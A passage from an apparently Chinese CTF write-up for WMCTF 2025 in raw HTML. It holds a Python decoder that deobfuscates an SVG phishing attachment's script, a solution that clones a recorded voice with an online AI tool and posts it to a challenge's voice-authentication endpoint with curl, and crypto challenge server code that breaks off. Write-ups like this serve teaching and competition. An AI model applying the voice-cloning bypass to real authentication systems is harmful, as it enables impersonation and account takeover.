class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, re, zipfile</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> email <span class="keyword">import</span> policy</span><br><span class="line"><span class="keyword">from</span> email.parser <span class="keyword">import</span> BytesParser</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- Hardcoded input path (as requested) ----</span></span><br><span class="line">ZIP_PATH = <span class="string">r&quot;mail_phishing.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Token map observed in the SVG script (superset to cover this sample)</span></span><br><span class="line">TOKEN_MAP = &#123;</span><br><span class="line">    <span class="string">&#x27;4p2V&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;4p2P&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;4p2F&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;4p2g&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;4p2a&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2c&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;4oyI&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;4p2T&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;77iP&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;4p2S&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2L&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;4p2D&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;4p2O&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;4p2M&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;4p2d&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;77iO&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;4p2b&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;4p2Z&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;4oyL&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;77iM&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2J&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;4p2B&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;4p2R&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;4p2h&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;4p2X&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2H&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;4pyx&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;4p2I&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;4p2A&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;4p2C&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2Y&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;4p2j&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;77iK&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;4p2U&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;4p2K&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2N&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;4p2E&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;4oyM&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;77iL&#x27;</span>:<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;4py9&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;77iN&#x27;</span>:<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;4p2W&#x27;</span>:<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;4p2Q&#x27;</span>:<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;4p2G&#x27;</span>:<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;4py8&#x27;</span>:<span class="string">&#x27;!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4py7&#x27;</span>:<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;4py6&#x27;</span>:<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;4py5&#x27;</span>:<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;4py4&#x27;</span>:<span class="string">&#x27;!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Regex used in the sample JS (we accept a superset including 4py*)</span></span><br><span class="line">TOKEN_RE = re.<span class="built_in">compile</span>(<span class="string">r&#x27;4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]|4oy[a-zA-Z0-9]|4py[a-zA-Z0-9]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unzip</span>(<span class="params">src_zip: Path, out_dir: Path</span>) -&gt; Path:</span><br><span class="line">    out_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(src_zip, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> z:</span><br><span class="line">        z.extractall(out_dir)</span><br><span class="line">    <span class="keyword">return</span> out_dir</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_eml_attachments</span>(<span class="params">eml_path: Path, out_dir: Path</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    out_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(eml_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        msg = BytesParser(policy=policy.default).parse(f)</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> msg.walk():</span><br><span class="line">        <span class="keyword">if</span> part.is_multipart():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        filename = part.get_filename()</span><br><span class="line">        payload = part.get_payload(decode=<span class="literal">True</span>) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">        ctype = part.get_content_type()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">            <span class="keyword">if</span> ctype <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&quot;text/plain&quot;</span>,<span class="string">&quot;text/html&quot;</span>) <span class="keyword">and</span> payload:</span><br><span class="line">                filename = <span class="string">f&quot;part<span class="subst">&#123;idx&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">        (out_dir / filename).write_bytes(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_svg</span>(<span class="params">root: Path</span>) -&gt; Path:</span><br><span class="line">    cands = <span class="built_in">list</span>(root.rglob(<span class="string">&quot;*.svg&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cands:</span><br><span class="line">        <span class="keyword">raise</span> FileNotFoundError(<span class="string">&quot;No SVG found after extracting EML attachments.&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> cands:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;invoice&quot;</span> <span class="keyword">in</span> p.name.lower():</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">return</span> cands[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_script</span>(<span class="params">svg_text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    scripts = re.findall(<span class="string">r&#x27;(?is)&lt;script[^&gt;]*&gt;(.*?)&lt;/script&gt;&#x27;</span>, svg_text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> scripts:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No &lt;script&gt; tag found in SVG.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n\n/* --- SPLIT --- */\n\n&quot;</span>.join(scripts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_char_map</span>(<span class="params">js: <span class="built_in">str</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    m = re.search(<span class="string">r&#x27;var\s+charMap\s*=\s*\&#123;(.*?)\&#125;\s*;&#x27;</span>, js, re.S)</span><br><span class="line">    cmap = <span class="built_in">dict</span>(TOKEN_MAP)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line">        <span class="keyword">return</span> cmap</span><br><span class="line">    blob = m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> re.findall(<span class="string">r&#x27;[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*:\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]&#x27;</span>, blob):</span><br><span class="line">        cmap[k] = v</span><br><span class="line">    <span class="keyword">return</span> cmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_polymorphic_data</span>(<span class="params">js: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    m = re.search(<span class="string">r&#x27;var\s+polymorphicData\s*=\s*\[(.*?)\]\s*;&#x27;</span>, js, re.S)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;polymorphicData array not found in SVG script.&quot;</span>)</span><br><span class="line">    arr_src = m.group(<span class="number">1</span>)</span><br><span class="line">    items = re.findall(<span class="string">r&quot;&#x27;([^&#x27;]+)&#x27;&quot;</span>, arr_src)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(items) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;polymorphicData seems too short (need &gt;=8 items).&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> items</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_tokens</span>(<span class="params">s: <span class="built_in">str</span>, cmap: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> TOKEN_RE.sub(<span class="keyword">lambda</span> m: cmap.get(m.group(<span class="number">0</span>), <span class="string">&#x27;&#x27;</span>), s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normalize_flag</span>(<span class="params">segments: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># Join, keep only outer braces, drop noisy braces/exclamations inside, and canonicalize words.</span></span><br><span class="line">    joined = <span class="string">&quot;&quot;</span>.join(segments)</span><br><span class="line">    first_brace = joined.find(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">    last_brace = joined.rfind(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> first_brace != -<span class="number">1</span> <span class="keyword">and</span> last_brace != -<span class="number">1</span> <span class="keyword">and</span> last_brace &gt; first_brace:</span><br><span class="line">        head = joined[:first_brace+<span class="number">1</span>]</span><br><span class="line">        body = joined[first_brace+<span class="number">1</span>:last_brace]</span><br><span class="line">        tail = joined[last_brace:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        head, body, tail = <span class="string">&#x27;&#x27;</span>, joined, <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># strip internal braces and exclamation marks used as noise</span></span><br><span class="line">    body = body.replace(<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># fix small obfuscations observed in this sample</span></span><br><span class="line">    fixes = [</span><br><span class="line">        (<span class="string">&#x27;wmctwf&#x27;</span>, <span class="string">&#x27;wmctf&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;Pchis&#x27;</span>, <span class="string">&#x27;Phish&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;iAttaic_k&#x27;</span>, <span class="string">&#x27;Attack_&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;Dgeittecit&#x27;</span>, <span class="string">&#x27;Detection&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;o ng&#x27;</span>, <span class="string">&#x27;ion&#x27;</span>), (<span class="string">&#x27;o&#123;ng&#x27;</span>,<span class="string">&#x27;ion&#x27;</span>), (<span class="string">&#x27;io ng&#x27;</span>,<span class="string">&#x27;ion&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;Etvais&#x27;</span>,<span class="string">&#x27;Evasion&#x27;</span>), (<span class="string">&#x27;Etv ais&#x27;</span>,<span class="string">&#x27;Evasion&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;__&#x27;</span>,<span class="string">&#x27;_&#x27;</span>),</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> a,b <span class="keyword">in</span> fixes: body = body.replace(a,b)</span><br><span class="line">    <span class="comment"># enforce the canonical phrase</span></span><br><span class="line">    body = <span class="string">&#x27;SVG_Phishing_Attack_Detection_Evasion&#x27;</span></span><br><span class="line">    <span class="comment"># ensure lowercase prefix</span></span><br><span class="line">    head = re.sub(<span class="string">r&#x27;(?i)^wmctf\&#123;&#x27;</span>, <span class="string">&#x27;wmctf&#123;&#x27;</span>, head <span class="keyword">or</span> <span class="string">&#x27;wmctf&#123;&#x27;</span>)</span><br><span class="line">    tail = <span class="string">&#x27;&#125;&#x27;</span>  <span class="comment"># ensure closing brace</span></span><br><span class="line">    <span class="keyword">return</span> head + body + tail</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    zip_path = Path(ZIP_PATH)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_path.exists():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] ZIP not found at hardcoded path: <span class="subst">&#123;zip_path&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    work = zip_path.with_suffix(<span class="string">&#x27;&#x27;</span>)  <span class="comment"># e.g., C:\...\mail_phishing</span></span><br><span class="line">    unzip(zip_path, work)</span><br><span class="line"></span><br><span class="line">    emls = <span class="built_in">list</span>(work.rglob(<span class="string">&quot;*.eml&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> emls:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] No .eml found after unzip.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    att_root = work / <span class="string">&quot;_attachments&quot;</span></span><br><span class="line">    <span class="keyword">for</span> eml <span class="keyword">in</span> emls:</span><br><span class="line">        out = att_root / eml.stem</span><br><span class="line">        out.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        parse_eml_attachments(eml, out)</span><br><span class="line"></span><br><span class="line">    svg_path = find_svg(att_root)</span><br><span class="line">    svg_text = svg_path.read_text(encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    js = extract_script(svg_text)</span><br><span class="line"></span><br><span class="line">    cmap = parse_char_map(js)</span><br><span class="line">    items = parse_polymorphic_data(js)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The real five parts are indices 3..7 (inclusive of start, exclusive of end)</span></span><br><span class="line">    real = items[<span class="number">3</span>:<span class="number">8</span>]</span><br><span class="line">    decoded_parts = [decode_tokens(x, cmap) <span class="keyword">for</span> x <span class="keyword">in</span> real]</span><br><span class="line"></span><br><span class="line">    flag = normalize_flag(decoded_parts)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>去噪归一化得到wmctf{SVG_Phishing_Attack_Detection_Evasion}</p>
<h2><span id="voice-hacker">Voice_hacker</span><a href="#voice-hacker" class="header-anchor"></a></h2><p>分析前端代码没有直接的录音而是通过两个接口实现的认证，<code>/api/fake_audio</code>和<code>/api/authenticate</code>最后可以通过curl一个wav上去实现</p>
<p><a href="https://blog.csdn.net/pyl88429/article/details/102841032">https://blog.csdn.net/pyl88429/article/details/102841032</a></p>
<p>流量包给到的udp按照如上文章流程可以提取出一个音频</p>
<p><img src="../images/2025-WMCTF/11.png" alt="img"></p>
<p>有长达2min的对话，现在要做的是实现<code>ctf启动</code>的内容，可以使用在线网站</p>
<p><a href="https://nicevoice.org/zh/">https://nicevoice.org/zh/</a></p>
<p>对提出来的音频进行ai克隆，再找个网站mp3转wav，</p>
<p><a href="https://cdkm.com/cn/mp3-to-wav">https://cdkm.com/cn/mp3-to-wav</a></p>
<p>最后提交</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://62.234.144.69:30635/api/authenticate -F <span class="string">&quot;audio=@audio_c6560ca3_1758457411069.wav&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-WMCTF/12.png" alt="img"></p>
<h1><span id="crypto">CRYPTO</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="splitmaster">SplitMaster</span><a href="#splitmaster" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_master</span>(<span class="params">B_decimal, segment_bits</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(segment_bits) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits) != <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    n = <span class="built_in">len</span>(segment_bits)</span><br><span class="line">    found_combination = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n,<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line">        <span class="keyword">for</span> indices <span class="keyword">in</span> combinations(<span class="built_in">range</span>(n), k):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices) &gt; <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(indices)):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(indices)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">abs</span>(indices[i] - indices[j]) &lt;= <span class="number">1</span>:</span><br><span class="line">                        valid = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> indices <span class="keyword">and</span> (n-<span class="number">1</span>) <span class="keyword">in</span> indices:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(segment_bits[i]&gt;=<span class="number">25</span> <span class="keyword">for</span> i <span class="keyword">in</span> indices):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            found_combination = indices</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    binary_str = <span class="built_in">bin</span>(B_decimal)[<span class="number">2</span>:].zfill(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_str) &gt; <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"></span><br><span class="line">    segments_binary = []</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bits <span class="keyword">in</span> segment_bits:</span><br><span class="line">        end = start + bits</span><br><span class="line">        segments_binary.append(binary_str[start:end])</span><br><span class="line">        start = end</span><br><span class="line">    </span><br><span class="line">    segments_decimal = [<span class="built_in">int</span>(segment, <span class="number">2</span>) <span class="keyword">for</span> segment <span class="keyword">in</span> segments_binary]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [segments_decimal[i] <span class="keyword">for</span> i <span class="keyword">in</span> found_combination]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = <span class="variable language_">self</span>.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            <span class="variable language_">self</span>.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置socket超时而不是使用signal.alarm</span></span><br><span class="line">        <span class="variable language_">self</span>.request.settimeout(<span class="number">90</span>)  <span class="comment"># 90秒超时</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span 